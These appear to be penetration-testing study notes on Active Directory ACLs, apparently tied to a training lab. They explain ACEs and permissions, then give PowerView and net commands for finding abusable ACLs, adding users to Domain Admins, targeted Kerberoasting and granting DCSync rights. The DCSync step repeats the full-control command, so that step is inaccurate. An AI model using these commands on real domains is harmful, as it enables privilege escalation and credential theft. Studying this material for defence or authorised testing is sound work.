## Summary

### Access Control List (ACL)

Enables control on the ability of a process to access objects and other resources in active directory based on:
– Access Tokens (security context of a process - identity and privs of user)
– Security Descriptors (SID of the owner, Discretionary ACL (DACL) and System ACL (SACL))

### Access Control Entries (ACE) 
It is a list of Access Control Entries (ACE) - ACE corresponds to individual permission or audits access. Who has permission and what can be done on an object?
• Two types:
– DACL - Defines the permissions trustees (a user or group) have on an object.
– SACL - Logs success and failure audit messages when an object is accessed

An Access Control Entry (ACE) is an individual rule within an ACL that defines specific permissions granted or denied to a user or group.

* Each ACE includes:
- The Security Principal (user, group, or computer to which permissions apply).
- The Access Mask (specific permissions such as read, write, delete, etc.).
- The Access Type (Allow or Deny).

Example: Understanding ACEs
An ACE might specify that:
- User Alice has Full Control over an Organizational Unit (OU).
- Group HelpDesk has Read and Write permissions to modify certain user attributes.
- User Bob is explicitly denied the ability to delete an object.

### Managing ACLs and ACEs in Active Directory
Administrators can modify ACLs and ACEs using graphical tools like Active Directory Users and Computers (ADUC) or command-line tools like PowerShell.

Modifying ACLs Using PowerShell
To add an ACE granting a user full control over an object:
```
$acl = Get-Acl "AD:CN=JohnDoe,OU=Users,DC=example,DC=com"
$identity = New-Object System.Security.Principal.NTAccount("example.com\Alice")
$permission = [System.DirectoryServices.ActiveDirectoryRights]::GenericAll
$accessRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, $permission, "Allow")
$acl.AddAccessRule($accessRule)
Set-Acl -Path "AD:CN=JohnDoe,OU=Users,DC=example,DC=com" -AclObject $acl
```
This script grants Alice full control over the user JohnDoe.

### Commands 

Get the ACLs associated with the specified object
* Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs

Get the ACLs associated with the specified prefix to be used for search
* Get-DomainObjectAcl -SearchBase "LDAP://CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose

Get the ACLs associated for Domain Admins
* Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose

Analyze Trust Relationships (Displays trust relationships between domains)
* Get-NetDomainTrust

Check ACLs on AD Objects  (Shows ACLs for a specific user account, resolving GUIDs to human-readable names)
* Get-ObjectAcl -SamAccountName "Administrator" -ResolveGUIDs

Search for interesting ACEs
* Find-InterestingDomainAcl -ResolveGUIDs

Get ACLs where studentx has interesting permissions
* Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student867"}

Get the ACLs associated with the specified path
* Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"

### DACL abuse

DACLs (Active Directory Discretionary Access Control Lists) are lists made of ACEs (Access Control Entries) that identify the users and groups that are allowed or denied access on an object. 

SACLs (Systems Access Control Lists) define the audit and monitoring rules over a securable object.

When misconfigured, ACEs can be abused to operate lateral movement or privilege escalation within an AD domain.

### Permisssions index

1. WriteDacl: Edit the object's DACL (i.e. "inbound" permissions).
2. GenericAll: Combination of almost all other rights.
3. GenericWrite: Combination of write permissions (Self, WriteProperty) among other things.
4. WriteProperty: Edit one of the object's attributes. The attribute is referenced by an "ObjectType GUID".
5. WriteOwner: Assume the ownership of the object (i.e. new owner of the victim = attacker, cannot be set to another user).With the "SeRestorePrivilege" right it is possible to specify an arbitrary owner.
6. Self: Perform "Validated writes" (i.e. edit an attribute's value and have that value verified and validate by AD). The "Validated writes" is referenced by an "ObjectType GUID".
7. AllExtendedRights: Peform "Extended rights". "AllExtendedRights" refers to that permission being unrestricted. This right can be restricted by specifying the extended right in the "ObjectType GUID".
8. User-Force-Change-Password: Change the password of the object without having to know the previous one.
9. DS-Replication-Get-Changes: One of the two extended rights needed to operate a DCSync.
10. DS-Replication-Get-Changes-All: One of the two extended rights needed to operate a DCSync.
11. Self-Membership: Edit the "member" attribute of the object.
12. Validated-SPN: Edit the "servicePrincipalName" attribute of the object.


### AddMember
This abuse can be carried out when controlling an object that has a GenericAll, GenericWrite, Self, AllExtendedRights or Self-Membership, over the target group.
The attacker can add a user/group/computer to a group.

**Windows**
* net group 'Domain Admins' 'user' /add /domain

Powershell: Active Directory module
* Add-ADGroupMember -Identity 'Domain Admins' -Members 'user'

Powershell: PowerSploit module
* Add-DomainGroupMember -Identity 'Domain Admins' -Members 'user'


**Linux**

With net and cleartext credentials (will be prompted)
* net rpc group addmem "$TargetGroup" "$TargetUser" -U "$DOMAIN"/"$USER" -S "$DC_HOST"

With net and cleartext credentials
* net rpc group addmem "$TargetGroup" "$TargetUser" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"

### ForceChangePassword
This abuse can be carried out when controlling an object that has a GenericAll, AllExtendedRights or User-Force-Change-Password over the target user.

### Targeted Kerberoasting
This abuse can be carried out when controlling an object that has a GenericAll, GenericWrite, WriteProperty or Validated-SPN over the target. A member of the Account Operator group usually has those permissions.

The attacker can add an SPN (ServicePrincipalName) to that account. Once the account has an SPN, it becomes vulnerable to Kerberoasting. This technique is called Targeted Kerberoasting.

**Windows**
1. Make sur that the target account has no SPN
- Get-DomainUser 'victimuser' | Select serviceprincipalname

2. Set the SPN
- Set-DomainObject -Identity 'victimuser' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}

3. Obtain a kerberoast hash
- $User = Get-DomainUser 'victimuser'
- $User | Get-DomainSPNTicket | fl

4. Clear the SPNs of the target account
- $User | Select serviceprincipalname
- Set-DomainObject -Identity victimuser -Clear serviceprincipalname

### Grant rights
This abuse can be carried out when controlling an object that has WriteDacl over another object.

The attacker can write a new ACE to the target object’s DACL (Discretionary Access Control List). This can give the attacker full control of the target object.

Instead of giving full control, the same process can be applied to allow an object to DCSync by adding two ACEs with specific Extended Rights (DS-Replication-Get-Changes and DS-Replication-Get-Changes-All). Giving full control leads to the same thing since GenericAll includes all ExtendedRights, hence the two extended rights needed for DCSync to work.

**Windows**

1. Give full control
- Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"

2. Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
- Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"
